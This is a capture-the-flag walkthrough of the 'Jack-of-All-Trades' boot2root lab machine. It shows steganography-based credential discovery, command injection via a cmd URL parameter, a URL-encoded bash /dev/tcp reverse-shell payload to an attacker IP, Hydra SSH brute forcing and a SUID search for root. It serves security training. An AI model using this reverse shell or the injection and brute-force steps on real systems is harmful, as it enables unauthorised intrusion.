<img width="400" alt="front" src="https://github.com/Th3l3mic/WriteUps/assets/167564930/ae3cb421-b719-46b6-8f55-c26c0eda4034">
<p></p>
<h1>Jack-of-All-Trades</h1>
Jack-of-All-Trades its a boot2root machine originally designed for Securi-Tay 2020, on a dificullty level marked as easy.
So lets begin! As usual we start our nmap scan to find open ports.
Result is kind of strange, theres a two open port's, but wait http on port 22? 
<p></p>
</p><img width="485" alt="nmap wynik" src="https://github.com/Th3l3mic/WriteUps/assets/167564930/c89c07ee-932c-4c74-9195-54f5b1440a53">
<p></p>
According to security features we're unable to open the page in our browser. To do this in firefo we must open aboutLconfig page and then search “network.security.ports.banned.override”, next we must check 'string' box and add 22 as a value.

<p></p>
<img width="955" alt="ustawienia port 22" src="https://github.com/Th3l3mic/WriteUps/assets/167564930/20c185ff-4c61-4e15-ab1f-ce449cbbc802">
<p></p>
After refreshing page eeverything should work's just fine.

In CTF's when we're dealing with an http server, it's always good to check page source.
Bingo! We found a comment encoded with base64:

<img width="957" alt="base" src="https://github.com/Th3l3mic/WriteUps/assets/167564930/f764308f-4524-43d2-8208-96a046ae46e5">
<p></p>
After decoding it's states:

<code>Remember to wish Johny Graves well with his crypto jobhunting! His encoding systems are amazing! Also gotta remember your password: u?WtKSraq</code>

We have some password and John Graves could be a clue, but we're gonna leave it for now. Let continue inspecting the page. As we can see there's three photos on the page and end point <code>/recovery.php</code>
<p></p>
The photos could be nice finding's, one of this photos is even called stego.jpg, that implies's that we're gonna probably dealing with steganography. Let's check this one. Everytime when we have some steganogrphy in files, its alway good to use strings command, but in this case there's nothing interesting, so let's use steghide:
<p></p>
<code>steghide extract -sf stego.jpg</code>
<p></p>
as a passphrase we;re use password that we found ealier <code>u?WtKSraq</code>

We've got something:
<p></p>
<img width="359" alt="zlezdjecie" src="https://github.com/Th3l3mic/WriteUps/assets/167564930/ea51231e-3982-4142-87a1-e0e6ee2d1b3c">

We'll do this same operation's for rest of the files, and in header.jpg we found credentials:
<p></p>
<img width="504" alt="haslaheader" src="https://github.com/Th3l3mic/WriteUps/assets/167564930/3803ef39-0ef2-44ba-93b2-0ccedbba6869">
<p></p>
<p></p>
<p></p>
It's time to check /recovery.php site and try to login with that creds.
<p></p>
<img width="864" alt="recovery" src="https://github.com/Th3l3mic/WriteUps/assets/167564930/846b290b-fee1-43ab-8f8d-ec83bdfeed0a">
<p></p>
After loggin in we found a message:
<img width="321" alt="cmd" src="https://github.com/Th3l3mic/WriteUps/assets/167564930/bb63a40e-377d-4e31-ae58-cf06718d20a1">

So in that case we should try give a parameter in url <code>/index.php?cmd=pwd</code> to check if this would work. It seems that everything work fine, so it's time to apply reverse shell as a parameter. Remeber url encoding!

<code>/index.php?cmd=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<code>attacker IP</code>2F4444%200%3E%261

Start netcat listerner on por 4444 and go, we have a shell. 
<img width="471" alt="2024-05-01 14_32_19-THM Browser-Based" src="https://github.com/Th3l3mic/WriteUps/assets/167564930/f3a3de36-5431-49cf-b49f-d3b2aaa82850">
and we're gona upgrade our shell to fully interactive shell with python.
<p></p>

So far so good... In <code>/home/jack</code> directory we're found list of passwords, thats were the Hydra comes in to play:

<img width="878" alt="hydra" src="https://github.com/Th3l3mic/WriteUps/assets/167564930/2c5c59eb-47ca-4b28-a66e-404573824be4">

<p></p>

We've got login a password, let's connect with ssh! It's working, and in jack's home direcory we've got user.jpg with the flag!

<img width="451" alt="flaga 1" src="https://github.com/Th3l3mic/WriteUps/assets/167564930/38dac768-539e-4ffc-9434-2ae28e448b01">

So it's time to get the root flag. Sudo -l didn't work, so let's find some SUID files:
<code> find / -type f -user root -perm -u=s 2>/dev/null</code>
It seems that we've got some nice findings here, we use string command to reveal the root.txt:

<img width="675" alt="root" src="https://github.com/Th3l3mic/WriteUps/assets/167564930/b68310f9-9fcd-425b-b02e-617706c9ffa4">

We did it!

T.


